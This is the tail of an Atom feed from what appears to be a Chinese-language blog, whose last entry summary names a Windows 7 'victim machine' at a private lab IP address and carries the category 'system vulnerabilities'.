&lt;p&gt; 受害机：&lt;br&gt; win7&lt;br&gt; ip:192.168.61.160&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="系统漏洞" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/"/>
    
    
  </entry>
  
</feed>
